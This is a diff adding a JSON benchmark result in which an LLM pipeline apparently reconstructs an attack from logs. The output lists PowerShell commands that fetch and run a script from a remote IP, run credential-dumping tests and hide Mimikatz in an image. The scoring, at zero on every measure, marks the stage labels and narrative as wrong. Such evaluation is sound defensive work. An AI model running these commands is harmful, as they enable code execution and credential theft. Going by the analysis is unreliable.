@@ -1,0 +1,92 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\u2605\u6587\u8b70\u6d41\u5e8f\u7a0b\u4e09\u3002ps1",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('\\\"http://124.223.85.207:8082/a\\\"'))\\\"\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"invoke-atomicTest T1003.003\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"invoke-atomicTest T1119 \"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"invoke-atomicTest T1547.001\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Copy-Item '\\\\.\\\\msxsl.exe' 'C:\\\\Windows\\\\Temp\\\\msxsl.exe';Invoke-AtomicTest T1220  -TestNumbers 1\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"import-module .\\\\Invoke-PSImage.ps1;Invoke-PSImage -Script .\\\\Invoke-Mimikatz.ps1 -Out .\\\\evil-kiwi.png -Image .\\\\995647.jpg\"",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"invoke-webrequest http://124.223.85.207:8082/Test.hta -method 'post' -usebasicparsing -contenttype \\\"application/json\\\"\"",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"invoke-atomicTest T1059.003 -getprereqs; invoke-atomicTest T1059.003\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"invoke-psimage -script .\\\\Invoke-Mimikatz.ps1 -out .\\\\evil-kiwi.png -image .\\\\995647.jpg\"",
+        "stage": "Defense Evasion"
+      }
+    ],
+    "narrative": "The attack starts with an initial access using PowerShell to download a script from a remote server. The script is executed, allowing the attacker to gain execution capabilities on the target machine. Then, the attacker uses various techniques to gather information about the target, such as running system commands and collecting documents. The attacker also attempts to escalate privileges using atomic tests. Additionally, the attacker tries to establish persistence by creating a scheduled task and writing files to disk. Furthermore, the attacker uses Mimikatz to steal credentials. Finally, the attacker uses PSImage to encode and exfiltrate data.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 238420,
+      "completion_tokens": 4107,
+      "total_tokens": 242527,
+      "wall_clock_s": 222.488,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 10,
+      "fn": 14
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 10,
+      "fn": 14,
+      "recall_partial": 0.0
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 238420,
+      "completion_tokens": 4107,
+      "total_tokens": 242527,
+      "wall_clock_s": 222.488,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "scale_v3",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": false,
+    "got_link_hints": false
+  }
+}
